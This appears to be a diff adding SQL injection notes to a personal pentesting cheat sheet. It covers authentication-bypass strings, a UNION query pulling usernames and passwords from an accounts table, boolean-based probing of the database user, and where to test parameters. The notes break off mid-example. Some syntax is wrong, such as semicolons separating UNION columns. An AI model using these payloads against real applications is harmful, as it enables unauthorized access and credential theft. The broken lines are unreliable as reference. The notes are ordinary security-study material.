@@ -129,10 +129,52 @@ SQL Injection
 ------------------
 http://www.w3schools.com/sql/sql_intro.asp
 
+Statements:
+> SELECT name, description FROM products WHERE id=9;
+UNION SELECT:
+> <SELECT statement> UNION <other SELECT statement>;
+comments in SQL:
+> #
+> --
 
+Strings for SQLi:
+> admin' OR 1=1 -- -
+> admin' OR 'a'='a      // two conditions to test with bool
 
+UNION SELECT SQLi:
+> SELECT name, description FROM products WHERE id='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
 
+// Thinks to test in web apps:
+> GET Parameter
+> POST Parameter
+> HTTP Headers
+  > User-Agent
+  > Cookie
+  > Accept
+  [...]
+ 
+Testing Input:
+> ' and ""
+> SELECT, UNION, [...]
+> Comments
+// !!! Allways Test only one injection at a time !!! //
 
+Pentest Szenario:
+> look in the URL for parameters to inject, like [...]?id=xxx
+> test the ' character in the URL
+> usernames and passwors can be testet via adding an ' character into the string
 
+Boolean Based SQLi:
+> SELECT Name, Description FROM Products WHERE id='' OR 'a'='a';      // test if input into id is true
+> select user();    // name of the user currently using the database
+> substring('test', 2, 1);    // substring of the given parameters, the position (2) and the lenght (1)
+> select substing(user(), 1, 1) = 'r';      // test, if the first character of user is an r
 
+UNION Based SQLi:
+> select description FROM items WHERE id='' UNION SELECT user(); -- -';     // fources the web app to show the user() funcion on the output page
+> [...]' UNION SELECT null; null; [...] -- -                                // detect the number of fields
+> [...]' UNION SELECT 'string 1', 'string 2', 'string n'; -- -              // test the fields for content
+> [...]' UNION SELECT user(), 'string 1',
 
+sqlmap:
+> 
